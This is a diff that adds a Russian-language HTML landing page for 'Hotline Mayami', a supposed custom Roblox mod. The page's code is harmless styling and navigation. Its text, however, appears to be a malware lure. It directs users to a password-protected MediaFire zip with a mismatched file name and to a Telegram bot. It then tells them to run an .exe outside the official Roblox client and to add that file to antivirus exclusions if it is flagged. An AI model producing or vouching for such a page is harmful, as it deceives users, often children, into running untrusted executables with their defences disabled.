@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hotline Mayami - Roblox Custom Mode</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%23121212'/%3E%3Ctext x='50%25' y='60%25' font-family='Press Start 2P, monospace' font-size='18' fill='%23d9468b' text-anchor='middle' dominant-baseline='middle' text-shadow='1px 1px 2px %23000, 0 0 5px %23d9468b'%3EHM%3C/text%3E%3C/svg%3E">
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=VT323&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'VT323', monospace;
+            color: #e0e0e0;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2c2c2c 100%);
+            font-size: 1.2em;
+            line-height: 1.4;
+            overflow-x: hidden;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.05),
+                rgba(0, 0, 0, 0.05) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            opacity: 0.3;
+            z-index: -1;
+            animation: crt-scan 3s linear infinite;
+        }
+        header {
+            text-align: center;
+            padding: 40px 20px;
+            background: #121212;
+            position: relative;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+        }
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #d9468b, #00b8d4);
+            opacity: 0.1;
+            z-index: 0;
+        }
+        h1 {
+            font-family: 'Press Start 2P', cursive;
+            font-size: 2.8em;
+            color: #d9468b;
+            text-shadow: 1px 1px 2px #000, 0 0 5px #d9468b;
+            position: relative;
+            z-index: 1;
+            animation: neon-flicker 2s infinite alternate;
+        }
+        p.tagline {
+            font-family: 'Press Start 2P', cursive;
+            font-size: 0.9em;
+            color: #ff4040;
+            text-shadow: 1px 1px 2px #000;
+            margin-top: 20px;
+            z-index: 1;
+        }
+        nav {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 8px;
+            background: #121212;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            gap: 10px;
+        }
+        nav a {
+            display: inline-block;
+            color: #e0e0e0;
+            text-decoration: none;
+            padding: 7px 18px;
+            font-family: 'Press Start 2P', cursive;
+            font-size: 0.85em;
+            border: 2px solid transparent;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        nav a:hover {
+            border-color: #d9468b;
+            color: #d9468b;
+            transform: scale(1.1);
+            box-shadow: 0 0 8px #d9468b;
+        }
+        nav a.active {
+            border-bottom: 2px solid #d9468b;
+            color: #d9468b;
+            box-shadow: 0 0 8px #d9468b;
+        }
+        nav a:hover::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(217, 70, 139, 0.2) 0%, transparent 70%);
+            z-index: -1;
+        }
+        section {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 25px;
+            background: #242424;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        section:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 4px 15px rgba(217, 70, 139, 0.3);
+        }
+        h2 {
+            font-family: 'Press Start 2P', cursive;
+            font-size: 1.8em;
+            color: #d9468b;
+            margin-bottom: 20px;
+            text-shadow: 1px 1px 2px #000;
+        }
+        p {
+            margin-bottom: 15px;
+        }
+        .game-link {
+            display: inline-block;
+            background: transparent;
+            border: 2px solid #d9468b;
+            color: #d9468b;
+            padding: 10px 20px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-family: 'Press Start 2P', cursive;
+            font-size: 0.9em;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 5px #d9468b;
+            animation: neon-pulse 2.5s infinite;
+            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="rgba(255, 64, 64, 0.8)" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>'), auto;
+            position: relative;
+        }
+        .game-link:hover {
+            background: #d9468b;
+            color: #1a1a1a;
+            box-shadow: 0 0 10px #d9468b;
+        }
+        .game-link:hover::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(217, 70, 139, 0.2) 0%, transparent 70%);
+            z-index: -1;
+        }
+        .features {
+            list-style: none;
+            padding: 0;
+        }
+        .features li {
+            margin: 15px 0;
+            padding: 15px;
+            background: #303030;
+            border-radius: 8px;
+            transition: background 0.3s ease;
+        }
+        .features li:hover {
+            background: #3a3a3a;
+        }
+        .download-link {
+            color: #00b8d4;
+            text-decoration: underline;
+            transition: color 0.3s ease;
+        }
+        .download-link:hover {
+            color: #d9468b;
+        }
+        .news-item {
+            margin-bottom: 15px;
+        }
+        .news-date {
+            font-family: 'Press Start 2P', cursive;
+            font-size: 0.8em;
+            color: #d9468b;
+            text-shadow: 1px 1px 2px #000;
+            margin-right: 10px;
+        }
+        .faq-item {
+            margin-bottom: 10px;
+            background: #303030;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .faq-item h3 {
+            font-family: 'Press Start 2P', cursive;
+            font-size: 1.2em;
+            color: #d9468b;
+            padding: 15px;
+            margin: 0;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            text-shadow: 1px 1px 2px #000;
+        }
+        .faq-item h3:hover {
+            background: #3a3a3a;
+        }
+        .faq-item p {
+            max-height: 0;
+            overflow: hidden;
+            padding: 0 15px;
+            transition: max-height 0.3s ease, padding 0.3s ease;
+        }
+        .faq-item.active p {
+            max-height: 300px;
+            padding: 15px;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            background: #121212;
+            color: #b0b0b0;
+        }
+        @keyframes neon-flicker {
+            0% { text-shadow: 1px 1px 2px #000, 0 0 5px #d9468b; }
+            100% { text-shadow: 1px 1px 2px #000, 0 0 8px #d9468b; }
+        }
+        @keyframes neon-pulse {
+            0% { box-shadow: 0 0 5px #d9468b; }
+            50% { box-shadow: 0 0 8px #d9468b; }
+            100% { box-shadow: 0 0 5px #d9468b; }
+        }
+        @keyframes crt-scan {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 4px; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Hotline Mayami</h1>
+        <p class="tagline">Ты любишь причинять боль?</p>
+    </header>
+    
+    <nav>
+        <a href="#home" aria-current="page">Главная</a>
+        <a href="#play">Играть</a>
+        <a href="#features">Ключевые особенности</a>
+        <a href="#news">Новости</a>
+        <a href="#community">Сообщество</a>
+        <a href="#download">Скачать</a>
+        <a href="#faq">FAQ</a>
+    </nav>
+    
+    <section id="home">
+        <h2>О режиме</h2>
+        <p>Hotline Mayami — это кастомный мод для Roblox, вдохновлённый культовой Hotline Miami. Погрузись в атмосферу неоновых 80-х с динамичным топ-даун экшеном, масками, комбо-атаками и жестокими миссиями.</p>
+        <p>Ты — наёмник в неоновом Майами. Выбирай маски, собирай оружие, выполняй задания и сражайся с врагами в опасных локациях. Мод предлагает кастомные карты, реиграбельность и поддержку мультиплеера для совместной игры.</p>
+        <p>Мы регулярно добавляем новые уровни, маски и улучшения, чтобы держать тебя в деле.</p>
+    </section>
+    
+    <section id="play">
+        <h2>Играть</h2>
+        <p>Hotline Mayami — кастомный мод, который легко установить! Скачай архив, распакуй его на рабочий стол и запусти .exe файл.</p>
+        <p><a href="#download" class="game-link">Скачать мод</a></p>
+    </section>
+    
+    <section id="features">
+        <h2>Ключевые особенности</h2>
+        <ul class="features">
+            <li>Надень маску тигра для скорости или медведя для сокрушительного урона.</li>
+            <li>Комбинируй удары, броски оружия и экзекуции для максимального счёта.</li>
+            <li>Пробирайся через клубы, отели и улицы, полные боссов и секретов.</li>
+            <li>Пройди миссии без смертей для A-rank и покажи, кто здесь босс.</li>
+            <li>Меняй скины и саундтрек, чтобы устроить настоящий неоновый хаос.</li>
+        </ul>
+    </section>
+    
+    <section id="news">
+        <h2>Новости</h2>
+        <p class="news-item"><span class="news-date">16.09.2025:</span> Новый уровень "Neon Nightmare" с улучшенной AI врагов. Исправлены баги с бросками оружия.</p>
+        <p class="news-item"><span class="news-date">10.09.2025:</span> Добавлены маски: Tiger (скорость), Bear (урон), Owl (обзор). Тестируем мультиплеер.</p>
+        <p class="news-item"><span class="news-date">05.09.2025:</span> Обновлён саундтрек: 5 новых треков в стиле 80-х. Оптимизация для мобильных устройств.</p>
+        <p class="news-item"><span class="news-date">01.09.2025:</span> Релиз версии 1.1: 7 уровней, 12 масок, поддержка геймпадов.</p>
+        <p class="news-item"><span class="news-date">25.08.2025:</span> Запущены челленджи с наградами в Robux для топ-игроков в бета-тесте.</p>
+    </section>
+    
+    <section id="community">
+        <h2>Сообщество</h2>
+        <p>Выбери свою маску и присоединяйся к хаосу: <a href="https://discord.gg/hotlinemayami" class="download-link" target="_blank">Discord Hotline Mayami</a>, X — @HotlineMayamiRoblox. Делись геймплеем и идеями!</p>
+    </section>
+    
+    <section id="download">
+        <h2>Скачать</h2>
+        <p>Скачай мод: <a href="https://www.mediafire.com/file/nqgkvh7ji30nl23/nightmarecraft.zip/file" class="download-link" target="_blank">MediaFire</a> (пароль: 1337).</p>
+        <p>Или через TG-бота: <a href="https://t.me/robloxextentions_bot" class="download-link" target="_blank">@robloxextentions_bot</a> — запроси zip-архив.</p>
+        <p>В нашем Telegram-боте (@robloxextentions_bot) вы найдёте больше кастомных сборок, обновлений и эксклюзивных модов. Не пропустите!</p>
+    </section>
+    
+    <section id="faq">
+        <h2>Часто задаваемые вопросы</h2>
+        <div class="faq-item">
+            <h3>Почему нет на официальном Roblox?</h3>
+            <p>Hotline Mayami был доступен на официальной платформе Roblox, но из-за жёсткого контента 18+ (кровь, насилие, атмосфера в стиле Hotline Miami) мод был забанен. Мы активно работаем над тем, чтобы адаптировать проект и вернуть его на платформу, сохранив дух оригинала. Пока же ты можешь скачать мод и играть через кастомный запуск.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Как скачать и установить?</h3>
+            <p>Скачай архив с <a href="https://www.mediafire.com/file/nqgkvh7ji30nl23/nightmarecraft.zip/file" class="download-link" target="_blank">MediaFire</a> (введи пароль: 1337) или запроси zip-архив через TG-бота <a href="https://t.me/robloxextentions_bot" class="download-link" target="_blank">@robloxextentions_bot</a>. Распакуй архив на рабочий стол, найди .exe файл и запусти его. Убедись, что у тебя установлен Roblox Player, чтобы всё работало как надо.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Работает ли мод на Roblox?</h3>
+            <p>Да, мод работает в экосистеме Roblox, но это кастомная версия, которая запускается через отдельный .exe файл, а не через официальный клиент Roblox. Это позволяет нам обойти ограничения платформы и сохранить весь неоновый хаос и жестокость Hotline Miami.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Как будет открываться мод?</h3>
+            <p>После установки мод открывается через запуск .exe файла, который ты найдёшь в распакованном архиве. При запуске он автоматически подключается к Roblox Player и загружает кастомные карты и механики. Убедись, что Roblox Player установлен и обновлён до последней версии.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Как запустить мод после установки?</h3>
+            <p>После распаковки архива на рабочий стол найди файл с расширением .exe (например, "HotlineMayami.exe"). Дважды щёлкни по нему, и мод запустится. Если у тебя установлен Roblox Player, игра автоматически загрузится. Если возникают ошибки, проверь, чтобы антивирус не блокировал файл, и убедись, что Roblox обновлён.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Безопасно ли устанавливать мод?</h3>
+            <p>Мы гарантируем, что архивы, размещённые на MediaFire и через TG-бота, проверены и безопасны. Однако, скачивая файлы, убедись, что используешь только наши официальные ссылки. Если антивирус ругается, добавь .exe в исключения — это стандартная реакция на кастомные исполняемые файлы.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Поддерживает ли мод мобильные устройства?</h3>
+            <p>На данный момент мод оптимизирован только для ПК, так как запуск через .exe файл требует Roblox Player на Windows. Мы работаем над поддержкой мобильных устройств, и скоро появится версия для Android и iOS. Следи за новостями в Discord!</p>
+        </div>
+    </section>
+    
+    <footer>
+        <p>&copy; 2025 Hotline Mayami Team. Все права защищены. Создано для сообщества Roblox.</p>
+    </footer>
+    
+    <script>
+        document.querySelectorAll('nav a').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
+                this.classList.add('active');
+                this.setAttribute('aria-current', 'page');
+                const target = document.querySelector(this.getAttribute('href'));
+                target.scrollIntoView({ behavior: 'smooth' });
+            });
+        });
+
+        document.querySelectorAll('.faq-item h3').forEach(header => {
+            header.addEventListener('click', function () {
+                const faqItem = this.parentElement;
+                const isActive = faqItem.classList.contains('active');
+                document.querySelectorAll('.faq-item').forEach(item => {
+                    item.classList.remove('active');
+                });
+                if (!isActive) {
+                    faqItem.classList.add('active');
+                }
+            });
+        });
+
+        window.addEventListener('scroll', () => {
+            const sections = document.querySelectorAll('section');
+            let currentSection = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (window.scrollY >= sectionTop - 60) {
+                    currentSection = section.getAttribute('id');
+                }
+            });
+            document.querySelectorAll('nav a').forEach(a => {
+                a.classList.remove('active');
+                a.removeAttribute('aria-current');
+                if (a.getAttribute('href') === `#${currentSection}`) {
+                    a.classList.add('active');
+                    a.setAttribute('aria-current', 'page');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
